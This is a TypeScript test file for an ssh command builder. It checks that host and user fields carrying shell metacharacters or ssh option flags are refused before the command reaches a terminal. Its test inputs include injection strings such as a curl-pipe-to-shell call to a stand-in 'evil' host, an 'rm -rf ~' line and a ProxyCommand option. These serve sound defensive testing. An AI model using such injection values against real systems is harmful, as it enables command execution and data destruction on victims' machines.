import assert from 'node:assert/strict';
import { test } from 'node:test';
import { buildSshCommand, describeSshTarget, isSafeSshHost, isSafeSshUser } from '../sshCommand';
import { EntityMetadata } from '../types';

const entity = (over: Partial<EntityMetadata> = {}): EntityMetadata => ({
  id: 'e1',
  name: 'prod',
  host: 'example.com',
  user: 'deploy',
  isSshEnabled: true,
  ...over,
});

/**
 * `host` and `user` are NOT trusted input. An entity arrives from a shared NAS
 * folder (sync merge) or from a colleague's share, and the envelope's GCM tag
 * authenticates the container, not the plausibility of a field inside it. The
 * composed line is then handed to `terminal.sendText(command, true)` — the
 * `true` presses Enter — so an unquoted metacharacter is a local shell running
 * whatever the sender chose, on the click of Connect.
 *
 * `sshKeyPath` was quoted here from the start; `user@host` never was.
 */

test('a host carrying shell metacharacters is refused, not composed', () => {
  assert.equal(buildSshCommand(entity({ host: 'example.com; curl http://evil/x|sh' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com`id`' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com$(id)' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'a.com\nrm -rf ~' })), undefined);
});

test('a user carrying shell metacharacters is refused', () => {
  assert.equal(buildSshCommand(entity({ user: 'root; id' })), undefined);
  assert.equal(buildSshCommand(entity({ user: 'a b' })), undefined);
});

test('a host that would read as an ssh OPTION is refused', () => {
  // Not a shell problem: ssh's own parser takes a leading dash as a flag.
  assert.equal(buildSshCommand(entity({ host: '-oProxyCommand=sh -c id' })), undefined);
  assert.equal(isSafeSshHost('-oProxyCommand=x'), false);
  assert.equal(isSafeSshUser('-l'), false);
});

test('ordinary hosts and users still compose', () => {
  assert.equal(buildSshCommand(entity()), 'ssh deploy@example.com');
  assert.equal(buildSshCommand(entity({ port: 2222 })), 'ssh -p 2222 deploy@example.com');
  assert.equal(buildSshCommand(entity({ host: '82.165.44.219', user: 'root' })), 'ssh root@82.165.44.219');
  assert.equal(isSafeSshHost('sub.domain.example.com'), true);
  assert.equal(isSafeSshHost('192.168.1.10'), true);
  assert.equal(isSafeSshHost('[2001:db8::1]'), true);
  assert.equal(isSafeSshUser('deploy_user-1'), true);
  assert.equal(isSafeSshUser('CORP\\alice'), true, 'Windows domain accounts are legitimate');
  assert.equal('CORP\\alice'.length, 10, 'a real backslash, not an eaten escape');
});

test('describeSshTarget refuses the same values, so no UI shows a forged target', () => {
  assert.equal(describeSshTarget(entity({ host: 'a.com; id' })), undefined);
  assert.equal(describeSshTarget(entity()), 'deploy@example.com');
});
